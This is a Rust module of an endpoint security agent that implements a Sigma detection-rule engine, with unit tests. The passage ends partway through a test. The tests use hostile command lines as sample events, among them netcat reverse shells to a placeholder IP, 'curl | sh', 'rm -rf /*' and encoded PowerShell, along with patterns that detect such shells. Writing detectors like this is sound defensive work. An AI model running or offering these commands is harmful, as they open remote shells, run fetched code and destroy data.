// Copyright (c) 2024-2026 Cyber Threat Consulting
// SPDX-License-Identifier: MIT

//! Native Sigma rule engine.
//!
//! [Sigma](https://sigmahq.io) is the open format detection rules are shared
//! in. This module reads Sigma rules (YAML) and evaluates them against the
//! processes of the endpoint, so the community's rules — or an organisation's
//! own — run on the agent without being rewritten.
//!
//! # What is supported
//!
//! - Log source: `category: process_creation`, for the endpoint's own
//!   operating system (rules for another product are skipped). Rules for
//!   other log sources are skipped and reported.
//! - Detection: field maps, lists of maps, keyword lists; values with `*`
//!   and `?` wildcards; `null`; numbers.
//! - Modifiers: `contains`, `startswith`, `endswith`, `all`, `re`, `cased`,
//!   `exists`, `windash`, `base64`, `base64offset`, `wide` / `utf16le` /
//!   `utf16`, `lt`, `lte`, `gt`, `gte`, `fieldref`.
//! - Condition: `and`, `or`, `not`, parentheses, `1 of`, `all of`, `any of`,
//!   a number `of`, with `them` or a `name*` pattern; a list of conditions.
//!
//! A rule using anything else (aggregations, `cidr`, placeholders…) is
//! refused with the reason rather than loaded with a different meaning.
//!
//! # Fields
//!
//! A process is presented with the field names Sigma uses for process
//! creation: `Image`, `CommandLine`, `ProcessId`, `User`, `ParentImage`,
//! `ParentCommandLine`, `ParentProcessId`. Field names are matched without
//! regard to case. A field the agent cannot provide (`OriginalFileName`,
//! `IntegrityLevel`, `Hashes`…) is absent: a rule requiring it does not match.

use super::process_monitor::ProcessInfo;
use regex::{Regex, RegexBuilder};
use std::collections::HashMap;
use std::path::Path;
use yaml_rust2::{Yaml, YamlLoader};

const MAX_RULE_FILE_BYTES: u64 = 512 * 1024;
const MAX_RULE_FILES: usize = 10_000;
const MAX_REGEX_SIZE: usize = 1024 * 1024;

/// Severity a rule declares.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum SigmaLevel {
    Informational,
    Low,
    Medium,
    High,
    Critical,
}

impl SigmaLevel {
    fn parse(level: &str) -> Self {
        match level.trim().to_ascii_lowercase().as_str() {
            "informational" | "info" => Self::Informational,
            "low" => Self::Low,
            "high" => Self::High,
            "critical" => Self::Critical,
            _ => Self::Medium,
        }
    }
}

/// An event a rule is evaluated against: field name (lower case) to value.
pub type SigmaEvent = HashMap<String, String>;

/// How one value of a rule is compared with a field.
#[derive(Debug)]
enum Matcher {
    /// The field is absent or empty.
    Null,
    Pattern(Regex),
    Compare(Comparison, f64),
    /// Equal to the value of another field.
    FieldRef(String),
}

#[derive(Debug, Clone, Copy)]
enum Comparison {
    Lt,
    Lte,
    Gt,
    Gte,
}

impl Matcher {
    fn matches(&self, value: Option<&str>, event: &SigmaEvent) -> bool {
        match self {
            Self::Null => value.is_none_or(str::is_empty),
            Self::Pattern(regex) => value.is_some_and(|value| regex.is_match(value)),
            Self::Compare(comparison, threshold) => value
                .and_then(|value| value.trim().parse::<f64>().ok())
                .is_some_and(|number| match comparison {
                    Comparison::Lt => number < *threshold,
                    Comparison::Lte => number <= *threshold,
                    Comparison::Gt => number > *threshold,
                    Comparison::Gte => number >= *threshold,
                }),
            Self::FieldRef(other) => match (value, event.get(other)) {
                (Some(value), Some(other)) => value.eq_ignore_ascii_case(other),
                _ => false,
            },
        }
    }
}

/// One `Field|modifiers: values` entry of a search.
#[derive(Debug)]
struct FieldMatch {
    /// Lower-cased field name.
    field: String,
    matchers: Vec<Matcher>,
    /// Every value must match (`|all`) instead of any.
    all: bool,
    /// `|exists`: only the presence of the field is tested.
    exists: Option<bool>,
}

impl FieldMatch {
    fn matches(&self, event: &SigmaEvent) -> bool {
        let value = event.get(&self.field).map(String::as_str);
        if let Some(expected) = self.exists {
            return value.is_some() == expected;
        }
        if self.all {
            self.matchers.iter().all(|m| m.matches(value, event))
        } else {
            self.matchers.iter().any(|m| m.matches(value, event))
        }
    }
}

/// One named search of the `detection` section.
#[derive(Debug)]
enum Search {
    /// Alternatives (a list of maps); each is a conjunction of field matches.
    /// A single map is one alternative.
    Fields(Vec<Vec<FieldMatch>>),
    /// A list of keywords: any of them in any field.
    Keywords(Vec<Regex>),
}

impl Search {
    fn matches(&self, event: &SigmaEvent) -> bool {
        match self {
            Self::Fields(alternatives) => alternatives
                .iter()
                .any(|fields| fields.iter().all(|field| field.matches(event))),
            Self::Keywords(keywords) => keywords
                .iter()
                .any(|keyword| event.values().any(|value| keyword.is_match(value))),
        }
    }
}

/// A parsed `condition`.
#[derive(Debug, PartialEq)]
enum Expr {
    Search(String),
    Not(Box<Expr>),
    And(Box<Expr>, Box<Expr>),
    Or(Box<Expr>, Box<Expr>),
    /// `N of pattern`; `None`: all of them.
    Of {
        at_least: Option<usize>,
        pattern: String,
    },
}

/// Whether a search name matches a `name*` pattern (`*` anywhere).
fn name_matches(pattern: &str, name: &str) -> bool {
    match pattern.split_once('*') {
        None => pattern == name,
        Some((prefix, rest)) => {
            let suffix = rest.rsplit('*').next().unwrap_or("");
            name.len() >= prefix.len() + suffix.len()
                && name.starts_with(prefix)
                && name.ends_with(suffix)
        }
    }
}

impl Expr {
    fn evaluate(&self, searches: &HashMap<String, Search>, event: &SigmaEvent) -> bool {
        match self {
            Self::Search(name) => searches.get(name).is_some_and(|s| s.matches(event)),
            Self::Not(inner) => !inner.evaluate(searches, event),
            Self::And(left, right) => {
                left.evaluate(searches, event) && right.evaluate(searches, event)
            }
            Self::Or(left, right) => {
                left.evaluate(searches, event) || right.evaluate(searches, event)
            }
            Self::Of { at_least, pattern } => {
                let selected: Vec<bool> = searches
                    .iter()
                    .filter(|(name, _)| name_matches(pattern, name))
                    .map(|(_, search)| search.matches(event))
                    .collect();
                // A pattern naming no search (a rule template without its
                // optional filters) selects nothing: neither "all" nor "one"
                // of nothing holds.
                match at_least {
                    None => !selected.is_empty() && selected.iter().all(|matched| *matched),
                    Some(count) => selected.iter().filter(|matched| **matched).count() >= *count,
                }
            }
        }
    }

    /// Search names the expression refers to directly.
    fn references(&self, out: &mut Vec<String>) {
        match self {
            Self::Search(name) => out.push(name.clone()),
            Self::Of { .. } => {}
            Self::Not(inner) => inner.references(out),
            Self::And(left, right) | Self::Or(left, right) => {
                left.references(out);
                right.references(out);
            }
        }
    }
}

/// Recursive-descent parser of a condition.
struct ConditionParser {
    tokens: Vec<String>,
    position: usize,
}

impl ConditionParser {
    fn parse(condition: &str) -> Result<Expr, String> {
        if condition.contains('|') {
            return Err("aggregations (`| count()`…) are not supported".to_string());
        }
        // Parentheses are tokens of their own.
        let spaced = condition.replace('(', " ( ").replace(')', " ) ");
        let mut parser = Self {
            tokens: spaced.split_whitespace().map(str::to_string).collect(),
            position: 0,
        };
        let expr = parser.or_expr()?;
        match parser.peek() {
            None => Ok(expr),
            Some(token) => Err(format!("unexpected '{token}' in condition")),
        }
    }

    fn peek(&self) -> Option<&str> {
        self.tokens.get(self.position).map(String::as_str)
    }

    fn next(&mut self) -> Option<String> {
        let token = self.tokens.get(self.position).cloned();
        self.position += 1;
        token
    }

    fn keyword(&self, word: &str) -> bool {
        self.peek()
            .is_some_and(|token| token.eq_ignore_ascii_case(word))
    }

    fn or_expr(&mut self) -> Result<Expr, String> {
        let mut left = self.and_expr()?;
        while self.keyword("or") {
            self.position += 1;
            left = Expr::Or(Box::new(left), Box::new(self.and_expr()?));
        }
        Ok(left)
    }

    fn and_expr(&mut self) -> Result<Expr, String> {
        let mut left = self.not_expr()?;
        while self.keyword("and") {
            self.position += 1;
            left = Expr::And(Box::new(left), Box::new(self.not_expr()?));
        }
        Ok(left)
    }

    fn not_expr(&mut self) -> Result<Expr, String> {
        if self.keyword("not") {
            self.position += 1;
            return Ok(Expr::Not(Box::new(self.not_expr()?)));
        }
        self.primary()
    }

    fn primary(&mut self) -> Result<Expr, String> {
        let token = self
            .next()
            .ok_or_else(|| "condition ends unexpectedly".to_string())?;
        if token == "(" {
            let inner = self.or_expr()?;
            return match self.next().as_deref() {
                Some(")") => Ok(inner),
                _ => Err("missing ')' in condition".to_string()),
            };
        }
        if token == ")" {
            return Err("unexpected ')' in condition".to_string());
        }
        // Quantifier: `1 of x*`, `all of them`, `any of x*`.
        if self.keyword("of") {
            let at_least = match token.to_ascii_lowercase().as_str() {
                "all" => None,
                "any" => Some(1),
                number => Some(
                    number
                        .parse::<usize>()
                        .map_err(|_| format!("'{token} of' is not a valid quantifier"))?,
                ),
            };
            self.position += 1;
            let target = self
                .next()
                .ok_or_else(|| "'of' needs a search name".to_string())?;
            let pattern = if target.eq_ignore_ascii_case("them") {
                "*".to_string()
            } else {
                target
            };
            return Ok(Expr::Of { at_least, pattern });
        }
        if ["and", "or", "not", "of"]
            .iter()
            .any(|word| token.eq_ignore_ascii_case(word))
        {
            return Err(format!("unexpected '{token}' in condition"));
        }
        Ok(Expr::Search(token))
    }
}

// ── Value compilation ───────────────────────────────────────────────────────

/// How a string value is anchored.
#[derive(Clone, Copy, PartialEq)]
enum Anchor {
    Exact,
    Contains,
    StartsWith,
    EndsWith,
}

/// Modifiers of one field key.
struct Modifiers {
    anchor: Anchor,
    all: bool,
    regex: bool,
    cased: bool,
    exists: bool,
    windash: bool,
    wide: bool,
    base64: bool,
    base64_offset: bool,
    comparison: Option<Comparison>,
    fieldref: bool,
}

impl Modifiers {
    fn parse(names: &[&str]) -> Result<Self, String> {
        let mut modifiers = Self {
            anchor: Anchor::Exact,
            all: false,
            regex: false,
            cased: false,
            exists: false,
            windash: false,
            wide: false,
            base64: false,
            base64_offset: false,
            comparison: None,
            fieldref: false,
        };
        for name in names {
            match name.to_ascii_lowercase().as_str() {
                "contains" => modifiers.anchor = Anchor::Contains,
                "startswith" => modifiers.anchor = Anchor::StartsWith,
                "endswith" => modifiers.anchor = Anchor::EndsWith,
                "all" => modifiers.all = true,
                "re" => modifiers.regex = true,
                "cased" => modifiers.cased = true,
                "exists" => modifiers.exists = true,
                "windash" => modifiers.windash = true,
                "wide" | "utf16le" | "utf16" => modifiers.wide = true,
                "base64" => modifiers.base64 = true,
                "base64offset" => modifiers.base64_offset = true,
                "lt" => modifiers.comparison = Some(Comparison::Lt),
                "lte" => modifiers.comparison = Some(Comparison::Lte),
                "gt" => modifiers.comparison = Some(Comparison::Gt),
                "gte" => modifiers.comparison = Some(Comparison::Gte),
                "fieldref" => modifiers.fieldref = true,
                other => return Err(format!("modifier '{other}' is not supported")),
            }
        }
        Ok(modifiers)
    }
}

/// Turn a Sigma string (wildcards `*` and `?`, `\` to escape them) into a
/// regular expression fragment.
fn glob_to_regex(value: &str) -> String {
    let mut pattern = String::with_capacity(value.len() + 8);
    let mut chars = value.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\\' => match chars.peek() {
                // An escaped wildcard or backslash is the literal character.
                Some(&next @ ('*' | '?' | '\\')) => {
                    pattern.push_str(&regex::escape(&next.to_string()));
                    chars.next();
                }
                _ => pattern.push_str(r"\\"),
            },
            '*' => pattern.push_str(".*"),
            '?' => pattern.push('.'),
            other => pattern.push_str(&regex::escape(&other.to_string())),
        }
    }
    pattern
}

fn compile(pattern: &str, cased: bool) -> Result<Regex, String> {
    RegexBuilder::new(pattern)
        .case_insensitive(!cased)
        .dot_matches_new_line(true)
        .size_limit(MAX_REGEX_SIZE)
        .build()
        .map_err(|e| format!("invalid pattern '{pattern}': {e}"))
}

/// The dash variants Windows command lines accept for a flag.
fn windash_variants(value: &str) -> Vec<String> {
    let flag = Regex::new(r"(^|\s)[-/]").expect("static pattern is valid");
    if !flag.is_match(value) {
        return vec![value.to_string()];
    }
    ["-", "/", "\u{2013}", "\u{2014}", "\u{2015}"]
        .iter()
        .map(|dash| {
            flag.replace_all(value, format!("${{1}}{dash}"))
                .into_owned()
        })
        .collect()
}

/// The three base64 forms of a value, depending on where it starts in the
/// encoded stream (Sigma `base64offset`).
fn base64_offset_variants(bytes: &[u8]) -> Vec<String> {
    use base64::Engine;
    const START: [usize; 3] = [0, 2, 3];
    const TRIM_END: [usize; 3] = [0, 3, 2];
    (0..3)
        .map(|shift| {
            let mut shifted = vec![b' '; shift];
            shifted.extend_from_slice(bytes);
            let encoded = base64::engine::general_purpose::STANDARD.encode(&shifted);
            let end = encoded
                .len()
                .saturating_sub(TRIM_END[(bytes.len() + shift) % 3]);
            encoded
                .get(START[shift]..end.max(START[shift]))
                .unwrap_or("")
                .trim_end_matches('=')
                .to_string()
        })
        .filter(|variant| !variant.is_empty())
        .collect()
}

/// Compile the string values of one field into patterns.
fn string_matchers(value: &str, modifiers: &Modifiers) -> Result<Vec<Matcher>, String> {
    if modifiers.regex {
        return Ok(vec![Matcher::Pattern(compile(value, true)?)]);
    }
    let mut variants = if modifiers.windash {
        windash_variants(value)
    } else {
        vec![value.to_string()]
    };

    let encoded = modifiers.wide || modifiers.base64 || modifiers.base64_offset;
    if encoded {
        use base64::Engine;
        let mut transformed = Vec::new();
        for variant in &variants {
            let bytes: Vec<u8> = if modifiers.wide {
                variant.encode_utf16().flat_map(u16::to_le_bytes).collect()
            } else {
                variant.as_bytes().to_vec()
            };
            if modifiers.base64_offset {
                transformed.extend(base64_offset_variants(&bytes));
            } else if modifiers.base64 {
                transformed.push(base64::engine::general_purpose::STANDARD.encode(&bytes));
            } else {
                // `wide` alone: the UTF-16 text as it would appear decoded.
                transformed.push(variant.clone());
            }
        }
        variants = transformed;
    }

    variants
        .iter()
        .map(|variant| {
            // Encoded values are literal: no wildcard in base64.
            let body = if modifiers.base64 || modifiers.base64_offset {
                regex::escape(variant)
            } else {
                glob_to_regex(variant)
            };
            let pattern = match modifiers.anchor {
                Anchor::Exact => format!("^{body}$"),
                Anchor::Contains => body,
                Anchor::StartsWith => format!("^{body}"),
                Anchor::EndsWith => format!("{body}$"),
            };
            // Base64 is case-sensitive by nature.
            let cased = modifiers.cased || modifiers.base64 || modifiers.base64_offset;
            compile(&pattern, cased).map(Matcher::Pattern)
        })
        .collect()
}

fn scalar_text(value: &Yaml) -> Option<String> {
    match value {
        Yaml::String(text) => Some(text.clone()),
        Yaml::Integer(number) => Some(number.to_string()),
        Yaml::Real(number) => Some(number.clone()),
        Yaml::Boolean(flag) => Some(flag.to_string()),
        _ => None,
    }
}

/// Compile one `Field|modifiers: value(s)` entry.
fn field_match(key: &str, value: &Yaml) -> Result<FieldMatch, String> {
    let mut parts = key.split('|');
    let field = parts.next().unwrap_or("").trim().to_ascii_lowercase();
    if field.is_empty() {
        return Err(format!("'{key}' names no field"));
    }
    let names: Vec<&str> = parts.collect();
    let modifiers = Modifiers::parse(&names).map_err(|e| format!("{key}: {e}"))?;

    if modifiers.exists {
        let expected = value
            .as_bool()
            .ok_or_else(|| format!("{key}: 'exists' takes true or false"))?;
        return Ok(FieldMatch {
            field,
            matchers: Vec::new(),
            all: false,
            exists: Some(expected),
        });
    }

    let values: Vec<&Yaml> = match value {
        Yaml::Array(items) => items.iter().collect(),
        single => vec![single],
    };
    if values.is_empty() {
        return Err(format!("{key}: no value"));
    }
    let mut matchers = Vec::new();
    for value in values {
        if value.is_null() {
            matchers.push(Matcher::Null);
            continue;
        }
        let text = scalar_text(value).ok_or_else(|| format!("{key}: unsupported value"))?;
        if let Some(comparison) = modifiers.comparison {
            let number = text
                .trim()
                .parse::<f64>()
                .map_err(|_| format!("{key}: '{text}' is not a number"))?;
            matchers.push(Matcher::Compare(comparison, number));
        } else if modifiers.fieldref {
            matchers.push(Matcher::FieldRef(text.trim().to_ascii_lowercase()));
        } else {
            matchers.extend(string_matchers(&text, &modifiers).map_err(|e| format!("{key}: {e}"))?);
        }
    }
    Ok(FieldMatch {
        field,
        matchers,
        all: modifiers.all,
        exists: None,
    })
}

fn field_map(map: &Yaml, search: &str) -> Result<Vec<FieldMatch>, String> {
    let hash = map
        .as_hash()
        .ok_or_else(|| format!("search '{search}' mixes maps and plain values"))?;
    hash.iter()
        .map(|(key, value)| {
            let key = key
                .as_str()
                .ok_or_else(|| format!("search '{search}' has a non-text field name"))?;
            field_match(key, value)
        })
        .collect()
}

fn compile_search(name: &str, definition: &Yaml) -> Result<Search, String> {
    match definition {
        Yaml::Hash(_) => Ok(Search::Fields(vec![field_map(definition, name)?])),
        Yaml::Array(items) if items.iter().all(|item| item.as_hash().is_some()) => items
            .iter()
            .map(|item| field_map(item, name))
            .collect::<Result<Vec<_>, _>>()
            .map(Search::Fields),
        Yaml::Array(items) => items
            .iter()
            .map(|item| {
                let keyword = scalar_text(item)
                    .ok_or_else(|| format!("search '{name}' mixes maps and plain values"))?;
                compile(&glob_to_regex(&keyword), false)
            })
            .collect::<Result<Vec<_>, _>>()
            .map(Search::Keywords),
        _ => Err(format!("search '{name}' is neither a map nor a list")),
    }
}

// ── Rules ───────────────────────────────────────────────────────────────────

/// A compiled Sigma rule.
#[derive(Debug)]
pub struct SigmaRule {
    pub id: String,
    pub title: String,
    pub description: String,
    pub level: SigmaLevel,
    /// Tags (`attack.t1059.001`…).
    pub tags: Vec<String>,
    /// `logsource.category`.
    pub category: Option<String>,
    /// `logsource.product`.
    pub product: Option<String>,
    searches: HashMap<String, Search>,
    /// Alternatives: the rule matches when any condition does.
    conditions: Vec<Expr>,
}

impl SigmaRule {
    /// Whether the rule matches the event.
    pub fn matches(&self, event: &SigmaEvent) -> bool {
        self.conditions
            .iter()
            .any(|condition| condition.evaluate(&self.searches, event))
    }

    /// MITRE ATT&CK technique identifiers among the tags (`T1059.001`).
    pub fn attack_techniques(&self) -> Vec<String> {
        self.tags
            .iter()
            .filter_map(|tag| {
                tag.to_ascii_lowercase()
                    .strip_prefix("attack.t")
                    .map(str::to_string)
            })
            .filter(|rest| rest.chars().next().is_some_and(|c| c.is_ascii_digit()))
            .map(|rest| format!("T{}", rest.to_ascii_uppercase()))
            .collect()
    }
}

fn text_field(document: &Yaml, key: &str) -> Option<String> {
    scalar_text(&document[key])
        .map(|text| text.trim().to_string())
        .filter(|text| !text.is_empty())
}

/// Parse one Sigma rule document.
pub fn parse_rule(yaml: &str) -> Result<SigmaRule, String> {
    let documents = YamlLoader::load_from_str(yaml).map_err(|e| format!("invalid YAML: {e}"))?;
    let document = match documents.as_slice() {
        [document] => document,
        [] => return Err("empty file".to_string()),
        _ => return Err("rule collections (several documents) are not supported".to_string()),
    };
    let title = text_field(document, "title").ok_or_else(|| "rule has no title".to_string())?;

    let detection = document["detection"]
        .as_hash()
        .ok_or_else(|| "rule has no detection section".to_string())?;
    let mut searches = HashMap::new();
    let mut condition_source = None;
    for (key, value) in detection {
        let name = key
            .as_str()
            .ok_or_else(|| "detection has a non-text key".to_string())?;
        match name {
            "condition" => condition_source = Some(value),
            "timeframe" => return Err("'timeframe' (correlation) is not supported".to_string()),
            _ => {
                searches.insert(name.to_string(), compile_search(name, value)?);
            }
        }
    }

    let condition_texts: Vec<String> = match condition_source {
        Some(Yaml::Array(items)) => items.iter().filter_map(scalar_text).collect(),
        Some(single) => scalar_text(single).into_iter().collect(),
        None => Vec::new(),
    };
    if condition_texts.is_empty() {
        return Err("rule has no condition".to_string());
    }
    let mut conditions = Vec::new();
    for text in &condition_texts {
        let expr = ConditionParser::parse(text)?;
        let mut references = Vec::new();
        expr.references(&mut references);
        for reference in references {
            if !searches.contains_key(&reference) {
                return Err(format!("condition refers to unknown search '{reference}'"));
            }
        }
        conditions.push(expr);
    }

    let logsource = &document["logsource"];
    let lower = |key: &str| text_field(logsource, key).map(|v| v.to_ascii_lowercase());
    Ok(SigmaRule {
        id: text_field(document, "id").unwrap_or_else(|| title.clone()),
        description: text_field(document, "description").unwrap_or_default(),
        level: text_field(document, "level")
            .map(|level| SigmaLevel::parse(&level))
            .unwrap_or(SigmaLevel::Medium),
        tags: document["tags"]
            .as_vec()
            .map(|tags| tags.iter().filter_map(scalar_text).collect())
            .unwrap_or_default(),
        category: lower("category"),
        product: lower("product"),
        title,
        searches,
        conditions,
    })
}

/// The Sigma product name of the endpoint's operating system.
fn host_product() -> &'static str {
    if cfg!(target_os = "windows") {
        "windows"
    } else if cfg!(target_os = "macos") {
        "macos"
    } else {
        "linux"
    }
}

/// Why a parsed rule is not evaluated on this endpoint, if so.
fn not_applicable(rule: &SigmaRule, product: &str) -> Option<String> {
    match rule.category.as_deref() {
        Some("process_creation") => {}
        Some(other) => return Some(format!("log source '{other}' is not collected")),
        None => return Some("no log source category".to_string()),
    }
    match rule.product.as_deref() {
        Some(wanted) if wanted != product => Some(format!("written for {wanted}")),
        _ => None,
    }
}

/// The fields a process is presented with.
pub fn process_event(process: &ProcessInfo, parent: Option<&ProcessInfo>) -> SigmaEvent {
    let mut event = SigmaEvent::new();
    let image = |p: &ProcessInfo| p.path.clone().unwrap_or_else(|| p.name.clone());
    event.insert("image".to_string(), image(process));
    event.insert(
        "commandline".to_string(),
        process.cmdline.clone().unwrap_or_else(|| image(process)),
    );
    event.insert("processid".to_string(), process.pid.to_string());
    if let Some(user) = &process.user {
        event.insert("user".to_string(), user.clone());
    }
    if let Some(ppid) = process.ppid {
        event.insert("parentprocessid".to_string(), ppid.to_string());
    }
    if let Some(parent) = parent {
        event.insert("parentimage".to_string(), image(parent));
        if let Some(cmdline) = &parent.cmdline {
            event.insert("parentcommandline".to_string(), cmdline.clone());
        }
    }
    event
}

/// Outcome of loading a rules directory.
#[derive(Debug, Default)]
pub struct SigmaLoadReport {
    /// Rules that will be evaluated.
    pub loaded: usize,
    /// Rules parsed but not evaluated on this endpoint (another log source
    /// or operating system).
    pub not_applicable: usize,
    /// Files refused, with the reason.
    pub errors: Vec<String>,
}

/// The rules evaluated on this endpoint.
#[derive(Debug, Default)]
pub struct SigmaEngine {
    rules: Vec<SigmaRule>,
}

impl SigmaEngine {
    /// An engine evaluating the given rules, whatever their log source.
    pub fn with_rules(rules: Vec<SigmaRule>) -> Self {
        Self { rules }
    }

    /// Load the `*.yml` / `*.yaml` rules found under `dir` (sub-directories
    /// included, as in the SigmaHQ repository). A missing directory gives an
    /// empty engine.
    pub fn load_dir(dir: &Path) -> (Self, SigmaLoadReport) {
        let mut engine = Self::default();
        let mut report = SigmaLoadReport::default();
        if !dir.is_dir() {
            return (engine, report);
        }
        if let Err(reason) = crate::checks::custom::is_trusted(dir) {
            report
                .errors
                .push(format!("{}: directory ignored, it {reason}", dir.display()));
            return (engine, report);
        }

        let mut files: Vec<std::path::PathBuf> = walkdir::WalkDir::new(dir)
            .max_depth(8)
            .follow_links(false)
            .into_iter()
            .flatten()
            .filter(|entry| entry.file_type().is_file())
            .map(walkdir::DirEntry::into_path)
            .filter(|path| {
                path.extension()
                    .is_some_and(|ext| ext == "yml" || ext == "yaml")
            })
            .take(MAX_RULE_FILES)
            .collect();
        files.sort();

        let product = host_product();
        for file in files {
            let label = file.display();
            if let Err(reason) = crate::checks::custom::is_trusted(&file) {
                report
                    .errors
                    .push(format!("{label}: file ignored, it {reason}"));
                continue;
            }
            if std::fs::metadata(&file).is_ok_and(|m| m.len() > MAX_RULE_FILE_BYTES) {
                report
                    .errors
                    .push(format!("{label}: file ignored, it is too large"));
                continue;
            }
            let rule = std::fs::read_to_string(&file)
                .map_err(|e| e.to_string())
                .and_then(|yaml| parse_rule(&yaml));
            match rule {
                Ok(rule) => match not_applicable(&rule, product) {
                    None => engine.rules.push(rule),
                    Some(_) => report.not_applicable += 1,
                },
                Err(e) => report.errors.push(format!("{label}: {e}")),
            }
        }
        report.loaded = engine.rules.len();
        (engine, report)
    }

    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    /// The rules an event matches.
    pub fn evaluate(&self, event: &SigmaEvent) -> Vec<&SigmaRule> {
        self.rules
            .iter()
            .filter(|rule| rule.matches(event))
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn event(fields: &[(&str, &str)]) -> SigmaEvent {
        fields
            .iter()
            .map(|(key, value)| (key.to_ascii_lowercase(), (*value).to_string()))
            .collect()
    }

    fn rule(detection: &str) -> SigmaRule {
        let yaml = format!(
            "title: Test\nlogsource:\n  category: process_creation\ndetection:\n{detection}"
        );
        parse_rule(&yaml).unwrap_or_else(|e| panic!("rule refused: {e}\n{yaml}"))
    }

    fn refused(detection: &str) -> String {
        let yaml = format!("title: Test\ndetection:\n{detection}");
        parse_rule(&yaml).expect_err("the rule should be refused")
    }

    const ENCODED_POWERSHELL: &str = r#"
title: Suspicious Encoded PowerShell Command Line
id: 5b7c3f4e-0000-4000-8000-000000000001
status: test
description: Detects PowerShell started with an encoded command.
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith:
              - '\powershell.exe'
              - '\pwsh.exe'
        - OriginalFileName: 'PowerShell.EXE'
    selection_cli:
        CommandLine|contains|windash:
            - ' -enc '
            - ' -EncodedCommand '
    filter_main_installer:
        ParentImage|startswith: 'C:\Program Files\Vendor\'
    condition: all of selection_* and not 1 of filter_main_*
falsepositives:
    - Administrative scripts
level: high
"#;

    #[test]
    fn a_community_style_rule_is_read_and_matched() {
        let rule = parse_rule(ENCODED_POWERSHELL).unwrap();
        assert_eq!(rule.title, "Suspicious Encoded PowerShell Command Line");
        assert_eq!(rule.id, "5b7c3f4e-0000-4000-8000-000000000001");
        assert_eq!(rule.level, SigmaLevel::High);
        assert_eq!(rule.category.as_deref(), Some("process_creation"));
        assert_eq!(rule.product.as_deref(), Some("windows"));
        assert_eq!(rule.attack_techniques(), ["T1059.001"]);

        let malicious = event(&[
            (
                "Image",
                r"C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell.exe",
            ),
            ("CommandLine", "powershell.exe -NoP -Enc SQBFAFgA"),
            (
                "ParentImage",
                r"C:\Program Files\Microsoft Office\WINWORD.EXE",
            ),
        ]);
        assert!(rule.matches(&malicious), "case-insensitive by default");

        // The slash form of the flag is the same flag.
        let slash = event(&[
            ("Image", r"C:\Program Files\PowerShell\7\pwsh.exe"),
            ("CommandLine", "pwsh /EncodedCommand SQBFAFgA"),
        ]);
        assert!(rule.matches(&slash));

        let filtered = event(&[
            (
                "Image",
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            ),
            ("CommandLine", "powershell.exe -enc SQBFAFgA"),
            ("ParentImage", r"C:\Program Files\Vendor\updater.exe"),
        ]);
        assert!(!rule.matches(&filtered), "excluded by the filter");

        let benign = event(&[
            (
                "Image",
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            ),
            ("CommandLine", "powershell.exe -File backup.ps1"),
        ]);
        assert!(!rule.matches(&benign));
        let other_program = event(&[
            ("Image", r"C:\Windows\System32\cmd.exe"),
            ("CommandLine", "cmd.exe /c echo -enc "),
        ]);
        assert!(!rule.matches(&other_program));
    }

    /// The example shipped in `config/` is what users start from.
    #[test]
    fn shipped_example_rule_loads_and_matches() {
        let rule = parse_rule(include_str!("../../../../config/sigma.example.yml")).unwrap();
        assert_eq!(rule.level, SigmaLevel::High);
        assert_eq!(not_applicable(&rule, "linux"), None);
        assert_eq!(not_applicable(&rule, "windows"), None);
        assert_eq!(rule.attack_techniques(), ["T1059.004"]);

        assert!(rule.matches(&event(&[
            ("Image", "/usr/bin/ncat"),
            ("CommandLine", "ncat -e /bin/sh 203.0.113.9 4444"),
        ])));
        assert!(rule.matches(&event(&[
            ("Image", r"C:\Tools\nc.exe"),
            ("CommandLine", r"nc.exe /e cmd.exe 203.0.113.9 4444"),
        ])));
        assert!(!rule.matches(&event(&[
            ("Image", "/usr/bin/nc"),
            ("CommandLine", "nc -zv 10.0.0.5 22"),
        ])));
        assert!(!rule.matches(&event(&[
            ("Image", "/usr/bin/python3"),
            ("CommandLine", "python3 -c pass"),
        ])));
    }

    #[test]
    fn values_wildcards_and_anchors() {
        let exact = rule("  sel:\n    Image: '/usr/bin/nc'\n  condition: sel");
        assert!(exact.matches(&event(&[("Image", "/usr/bin/NC")])));
        assert!(!exact.matches(&event(&[("Image", "/usr/bin/ncat")])));

        let wildcard = rule("  sel:\n    CommandLine: '* --reverse ?:*'\n  condition: sel");
        assert!(wildcard.matches(&event(&[("CommandLine", "tool --reverse a:4444")])));
        assert!(!wildcard.matches(&event(&[("CommandLine", "tool --reverse ab:4444")])));

        // An escaped wildcard is a literal character.
        let literal = rule("  sel:\n    CommandLine|contains: 'rm -rf /\\*'\n  condition: sel");
        assert!(literal.matches(&event(&[("CommandLine", "sh -c rm -rf /*")])));
        assert!(!literal.matches(&event(&[("CommandLine", "sh -c rm -rf /tmp")])));

        // Regular expression characters in a value are literal.
        let dotted = rule("  sel:\n    Image|endswith: '/a.b'\n  condition: sel");
        assert!(dotted.matches(&event(&[("Image", "/x/a.b")])));
        assert!(!dotted.matches(&event(&[("Image", "/x/aXb")])));

        let all = rule(
            "  sel:\n    CommandLine|contains|all:\n      - 'curl'\n      - '| sh'\n  condition: sel",
        );
        assert!(all.matches(&event(&[("CommandLine", "curl http://x | sh")])));
        assert!(!all.matches(&event(&[("CommandLine", "curl http://x -o f")])));

        let cased = rule("  sel:\n    CommandLine|contains|cased: 'IEX'\n  condition: sel");
        assert!(cased.matches(&event(&[("CommandLine", "IEX(New-Object)")])));
        assert!(!cased.matches(&event(&[("CommandLine", "iex(New-Object)")])));

        let regex = rule("  sel:\n    CommandLine|re: 'nc(at)?\\s+-e\\s'\n  condition: sel");
        assert!(regex.matches(&event(&[("CommandLine", "ncat  -e /bin/sh")])));
        assert!(
            !regex.matches(&event(&[("CommandLine", "NCAT -e /bin/sh")])),
            "re is cased"
        );
    }

    #[test]
    fn null_exists_numbers_and_field_references() {
        let null = rule("  sel:\n    ParentImage: null\n  condition: sel");
        assert!(null.matches(&event(&[("Image", "/bin/sh")])));
        assert!(!null.matches(&event(&[("ParentImage", "/sbin/init")])));

        let exists = rule("  sel:\n    User|exists: true\n  condition: sel");
        assert!(exists.matches(&event(&[("User", "root")])));
        assert!(!exists.matches(&event(&[("Image", "/bin/sh")])));

